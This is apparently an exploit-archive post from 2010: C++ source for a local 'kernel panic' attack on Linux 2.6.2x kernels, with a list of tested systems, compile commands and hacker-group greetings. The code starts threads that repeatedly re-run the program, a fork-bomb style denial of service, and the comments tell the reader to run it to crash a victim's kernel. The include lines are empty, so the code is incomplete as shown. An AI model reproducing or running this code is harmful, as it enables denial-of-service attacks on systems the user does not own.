# Exploit Title: Pthread Local Kernel 2.6.2x Kernel Panic Exploit   
# Date: 20 April 2010            
# Author: mywisdom
# Organizationdevilzc0de.org , goldhaxors.com , jasakom.com, jatimcrew.org, darkc0de.com,solhack 2003-2004)
# Country: Indonesia
# Software Link: http://www.kernel.org/pub/linux/kernel/v2.6/
# Version: Kernel 2.6.2x
# Platform / Tested on:
-  Linux Kernel 2.6.22-14-Generic #4  (crash)
-  Linux Kernel 2.6.29.6 #2  (crash)
-  Linux Kernel 2.6.18-128.2.1.el5.028stab064.7 #1 SMP (failed)
-  Slitaz-*****ng Linux (Kernel 2.6.30)  (crash)
-  Backtrack 3   (Kernel 2.6.21.5 #4 SMP)  (crash)

# category: local, dos/poc, etc
#temporary download: http://yoyoparty.com/upload/devilzc0de.cpp  (you may delete this boss)
# Code :

/***
filename: devilzc0de.cpp (do not change this to work!!!)
devilzc0de private local kernel 2.6.2x kernel panic via pthread
c0d3r: mywisdom (solhack 2004 c0d3r, devilzc0de c0d3r 2010)
do visit:
www.devilzc0de.org
www.goldhaxors.com
www.inj3ct0r.com
compile using D_REERANT :
 g++ -o devilzc0de devilzc0de.cpp -lpthread -D_REENTRANT

special thanks to: goldhaxors crews and members
more thanks to :Inj3ct0r (http://inj3ct0r.com/),    r0073r, devilzc0de crews and members,yogyacarderlink crews and members, jatimcrew crews and members, hackernewbie crews and members,fasthacker crews and members and so on
greets: Danzel,unkn0wn,x-n3t
very special thanks to my beloved girl: juliana a.k.a vilecen a.k.a prisciela mariebeth
greets2: gunslinger, flyv666,kiddies, petimati,xtr0nic,whitehat,cr4wl3r,EA ANGEL,gblack,v3n0m,d3xt3r,chaer newbie,blu3k1d (dark shine),linggah,yadoy666,aurel666,devil nongkrong,ki lurah,z0mb13,byz999,iblis muda,7460,edelweiss,pokeng rootboy,n0ge,stardustmemory,angela zhang,fasthacker,hendri note,kingkong,thitha, nur si sister chubby,etc...
yang ketingalan namanya maaf yah laen kali masih ada lagi exploit laen
greets to my old friends: evidence,getch,foxx at solhack 2003-2004
compile :
g++ -o devilzc0de devilzc0de.cpp -lpthread -D_REENTRANT
and then run to crash your victim's kernel:
./devilzc0de
:-P
regards
mywisdom
***/
#include
#include
#include
#include
#include
#include
#include
#include
#include

int _fuck() {
   static bool mulai = false;
//STDIN  
 static const int STDIN = 0;
   

    if (!mulai) {
       
         termios gunslinger;
        tcgetattr(STDIN, &gunslinger);
        gunslinger.c_lflag &= ~ICANON;
        tcsetattr(STDIN, TCSANOW, &gunslinger);
        setbuf(stdin, NULL);
        mulai = true;
    }

    int hack;
    ioctl(STDIN, FIONREAD, &hack);
    return hack;
}

using namespace std;

int mywisdom = false;

void * eksploitasi(void *generic_pointer)
{
 while (!mywisdom)
   {
    
      //starting kernel panic
printf("..pthread creating..please wait..crashing..");
system("./devilzc0de");
 

      pthread_yield();
   }
  
   return NULL;
}


int main()
{
 

   pthread_t tretid1;
 pthread_t tretid2;
 pthread_t tretid3;
 

  //thread cukup buat bikin mampus
   pthread_create(&tretid1, NULL, eksploitasi, NULL);
 pthread_create(&tretid2, NULL, eksploitasi, NULL);
 pthread_create(&tretid3, NULL, eksploitasi, NULL);
 
    while (!_fuck())
   {
   pthread_yield();
   }
   mywisdom = false;

   return 0;
}
